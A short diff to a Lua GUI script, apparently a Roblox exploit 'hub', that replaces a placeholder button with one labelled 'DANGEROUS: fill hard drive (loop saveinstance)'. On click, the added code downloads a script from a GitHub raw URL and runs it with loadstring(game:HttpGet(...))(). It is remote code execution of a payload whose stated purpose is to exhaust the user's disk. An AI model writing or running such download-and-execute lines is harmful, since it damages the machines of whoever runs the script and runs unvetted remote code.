@@ -85,11 +85,10 @@ local button5 = Instance.new("TextButton")
 button5.Parent = scrollableFrame
 button5.Size = UDim2.new(0, 360, 0, 50)
 button5.Position = UDim2.new(0, 10, 0, 250)
-button5.Text = "Run Script 5 - Defense Mechanism"
-button5.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+button5.Text = "DANGEROUS: fill hard drive (loop saveinstance)"
+button5.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 button5.MouseButton1Click:Connect(function()
-    print("Executing Defense Mechanism script")
-    -- Add your specific script code here
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KubaYT106Super/Scripts-of-Kuba-s-Hub/refs/heads/main/fill_pc_harddrive"))()
 end)
 
 -- You can continue adding more buttons with unique names and positions as needed
